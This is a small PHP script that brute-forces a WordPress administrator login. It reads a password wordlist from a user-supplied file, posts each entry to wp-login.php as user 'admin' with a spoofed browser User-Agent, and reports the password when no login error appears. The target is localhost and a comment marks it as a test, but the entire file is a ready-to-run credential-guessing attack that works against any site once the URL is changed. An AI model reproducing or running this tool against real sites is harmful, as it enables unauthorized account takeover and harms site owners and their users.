<?php
    /**
     * Reading wordlist
     * 
     * @return string   $contents
     */
    function read_wordlist(){
        $filename       = readline('Type wordlist file location: ');
        if (file_exists($filename)){
            $name       = basename($filename);
            print       "\033[33m[~] Loading {$name} wordlist...\033[0m\n";
            $file       = fopen($filename, 'r');
            $contents   = fread($file, filesize($filename));
            print       "\033[32m[+] {$name} loaded successfuly!\033[0m\n";
            return $contents;
        } else {
            print       "\033[31m[-][!] 404 File Not Found!\033[0m\\n";
            exit;
        }
    }
    /**
     * Starting brute force *TEST*
     * 
     * @return void
     */
    function brute(string $wordlist){
        $wlist = explode("\n", $wordlist);
        foreach ($wlist as $password){
            $curl = curl_init('http://localhost/wordpress/wp-login.php');
                    curl_setopt_array($curl, [
                        CURLOPT_POST => true,
                        CURLOPT_POSTFIELDS => [
                            'log' => 'admin',
                            'pwd' => $password,
                            'wp-submit'
                        ],
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_HTTPHEADER => [
                            'User-Agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19'
                        ]
                    ]);
            $result = curl_exec($curl);
            if (strpos($result, '<div id="login_error">')) {
                print "\033[31m[-] password \033[0m\"{$password}\"\033[31m is incorrect \033[0m\n";
            } else {
                print "\033[32m[+] Your password is \033[0m\"{$password}\"\n";
                break;
            }
        }
    }

    $w = read_wordlist();
    brute($w);
    